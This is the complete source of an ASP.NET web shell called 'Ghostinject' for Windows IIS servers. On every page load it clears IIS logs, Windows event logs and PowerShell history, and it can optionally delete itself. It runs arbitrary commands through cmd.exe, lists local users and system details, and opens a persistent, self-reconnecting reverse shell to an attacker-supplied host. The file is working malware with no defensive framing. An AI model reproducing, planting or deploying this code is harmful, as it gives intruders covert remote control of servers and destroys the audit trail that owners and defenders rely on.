<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Threading" %>

<script runat="server">
// ========== STEALTH CONFIGURATION ==========
private const bool SELF_DELETE = false;
private const bool CLEAN_LOGS_ON_START = true;

// ========== LOG CLEANING ==========
private void StealthCleanup()
{
    try
    {
        string iisLogDir = @"C:\inetpub\logs\LogFiles\";
        if (Directory.Exists(iisLogDir))
        {
            foreach (string logFile in Directory.GetFiles(iisLogDir, "*.log", SearchOption.AllDirectories))
            {
                if ((File.GetAttributes(logFile) & FileAttributes.ReadOnly) != FileAttributes.ReadOnly)
                {
                    try { File.WriteAllText(logFile, ""); } catch { }
                }
            }
        }
        try { Process.Start("wevtutil.exe", "cl \"Windows PowerShell\""); } catch { }
        try { Process.Start("wevtutil.exe", "cl \"System\""); } catch { }
        try { Process.Start("wevtutil.exe", "cl \"Security\""); } catch { }
        string psHistory = Environment.GetEnvironmentVariable("USERPROFILE") + @"\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";
        if (File.Exists(psHistory)) { try { File.WriteAllText(psHistory, ""); } catch { } }
        if (SELF_DELETE)
        {
            string selfPath = Server.MapPath(Request.FilePath);
            string batPath = Path.GetTempFileName() + ".bat";
            string batContent = "@echo off\ntimeout /t 3 /nobreak > NUL\ndel /f /q \"" + selfPath + "\"\ndel /f /q \"" + batPath + "\"\n";
            File.WriteAllText(batPath, batContent);
            Process.Start(batPath);
        }
    }
    catch { }
}

// ========== COMMAND EXECUTION ==========
private string ExecuteCommand(string cmd)
{
    try
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        using (Process p = Process.Start(psi))
        {
            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit(5000);
            return output + error;
        }
    }
    catch (Exception ex) { return "[Error: " + ex.Message + "]"; }
}

// ========== PERSISTENT REVERSE SHELL ==========
private bool StartReverseShell(string host, int port)
{
    try
    {
        Thread t = new Thread(() => ReverseShellLoop(host, port));
        t.IsBackground = true;
        t.Start();
        return true;
    }
    catch { return false; }
}

private void ReverseShellLoop(string host, int port)
{
    while (true)
    {
        try
        {
            using (TcpClient client = new TcpClient())
            {
                client.Connect(host, port);
                using (NetworkStream stream = client.GetStream())
                using (StreamReader reader = new StreamReader(stream))
                using (StreamWriter writer = new StreamWriter(stream))
                {
                    writer.AutoFlush = true;
                    while (client.Connected)
                    {
                        string cmd = reader.ReadLine();
                        if (cmd == null) break;
                        if (cmd.ToLower() == "exit") break;
                        string output = ExecuteCommand(cmd);
                        writer.Write(output + "\n");
                    }
                }
            }
        }
        catch { }
        Thread.Sleep(10000);
    }
}

// ========== GET LOCAL USERS ==========
private string GetLocalUsers()
{
    try
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c net user";
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        using (Process p = Process.Start(psi))
        {
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit(3000);
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            foreach (string line in output.Split('\n'))
            {
                string trimmed = line.Trim();
                if (System.Text.RegularExpressions.Regex.IsMatch(trimmed, @"^[A-Za-z0-9_\.-]+\s"))
                {
                    string[] parts = trimmed.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                    if (parts.Length > 0)
                        sb.Append(Server.HtmlEncode(parts[0])).Append("<br>");
                }
            }
            return sb.Length > 0 ? sb.ToString() : "No users found.";
        }
    }
    catch { return "Unable to retrieve user list."; }
}

// ========== PAGE LOAD & EVENT HANDLERS ==========
void Page_Load(object sender, EventArgs e)
{
    Response.ContentEncoding = System.Text.Encoding.UTF8;
    if (CLEAN_LOGS_ON_START) StealthCleanup();
    if (!IsPostBack)
    {
        ShowInfo();
    }
}

void ShowInfo()
{
    string users = GetLocalUsers();
    string info = @"
    <ul>
    <li>System: " + Environment.OSVersion + @"</li>
    <li>Machine: " + Environment.MachineName + @"</li>
    <li>Current User: " + Environment.UserName + @"</li>
    <li>Directory: " + Environment.CurrentDirectory + @"</li>
    <li>.NET: " + Environment.Version + @"</li>
    <li>IIS: " + Request.ServerVariables["SERVER_SOFTWARE"] + @"</li>
    <li><strong>Local users (net user):</strong><br>" + users + @"</li>
    </ul>";
    lblInfo.Text = info;
}

void btnExec_Click(object sender, EventArgs e)
{
    string cmd = txtCmd.Text.Trim();
    if (!string.IsNullOrEmpty(cmd))
    {
        string result = ExecuteCommand(cmd);
        litResult.Text = "<pre>" + Server.HtmlEncode(result) + "</pre>";
    }
}

void btnRevShell_Click(object sender, EventArgs e)
{
    string host = txtRevHost.Text.Trim();
    int port;
    if (string.IsNullOrEmpty(host) || !int.TryParse(txtRevPort.Text.Trim(), out port))
    {
        litRevMsg.Text = "<span style='color:red'>Invalid IP or port.</span>";
        return;
    }
    bool started = StartReverseShell(host, port);
    litRevMsg.Text = started ? "<span style='color:green'>Ghostinject: Persistent reverse shell started (auto-reconnect). Keep listener open!</span>" 
                             : "<span style='color:red'>Failed to start reverse shell.</span>";
}
</script>

<!DOCTYPE html>
<html>
<head>
    <title>Ghostinject | ASPX Stealth Shell</title>
    <style>
        body { background: #0a0f0a; color: #0f0; font-family: monospace; padding: 20px; }
        input, button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 5px; margin: 5px; }
        button { cursor: pointer; }
        pre { background: #111; padding: 10px; border: 1px solid #0f0; overflow: auto; }
        .section { margin-bottom: 20px; border-top: 1px solid #0f0; padding-top: 10px; }
        .footer { font-size: 0.8em; margin-top: 30px; color: #484; }
    </style>
</head>
<body>
    <h2>[+] Ghostinject - Windows IIS (Stealth + Persistent Shell)</h2>

    <div class="section">
        <h3>[*] Target Recon</h3>
        <asp:Label ID="lblInfo" runat="server" />
    </div>

    <form id="form1" runat="server">
        <div class="section">
            <h3>[$] Command Execution</h3>
            <asp:TextBox ID="txtCmd" runat="server" Width="400px" />
            <asp:Button ID="btnExec" runat="server" Text="Run" OnClick="btnExec_Click" />
            <asp:Literal ID="litResult" runat="server" />
        </div>

        <div class="section">
            <h3>[#] Persistent Reverse Shell (auto-reconnect)</h3>
            <asp:TextBox ID="txtRevHost" runat="server" placeholder="Your IP" Width="200px" /><br />
            <asp:TextBox ID="txtRevPort" runat="server" placeholder="Port" Width="100px" /><br />
            <asp:Button ID="btnRevShell" runat="server" Text="Start Ghostinject" OnClick="btnRevShell_Click" />
            <asp:Literal ID="litRevMsg" runat="server" />
        </div>
    </form>

    <div class="footer">
        Ghostinject.aspx - Stealth, auto log cleaning, IIS compatible
    </div>
</body>
</html>
